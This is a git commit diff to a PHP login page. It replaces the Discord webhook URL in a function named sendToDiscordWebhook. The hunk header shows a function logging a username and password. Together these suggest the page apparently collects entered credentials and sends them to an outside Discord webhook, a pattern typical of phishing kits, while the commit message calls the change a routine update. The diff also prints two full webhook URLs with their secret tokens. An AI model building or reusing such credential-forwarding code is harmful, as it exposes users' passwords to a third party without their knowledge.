b5770164b7ad2acca817d0016a09ea1d4dc2c2cb
tristan-web <tristan@alohamicroacademy.org>
2025-12-21 17:51:48 +0000

    Change Discord webhook URL in login.php
    Updated Discord webhook URL in sendToDiscordWebhook function.

--- login.php
+++ login.php
@@ -38,7 +38,7 @@ function logData($username, $password) {
 
 function sendToDiscordWebhook($data) {
     $webhookUrls = [
-        'https://discord.com/api/webhooks/1295529347637055590/FO0C7KQJhZvUi7bhpjAZ2afMKbcpF34vKU19QA2omnKwFzTchgUhnBlTivPk6t87Sst8',  // Replace with your actual Discord webhook URL
+        'https://discord.com/api/webhooks/1452357803518984326/iS4zw53NFdePdMFmR5rfRBgTBcG8SQIJNwXZkVhsUOEme4Can0H4r7Z7GekR-vvZ0GSF',  // Replace with your actual Discord webhook URL
     ];
 
     $embed = [
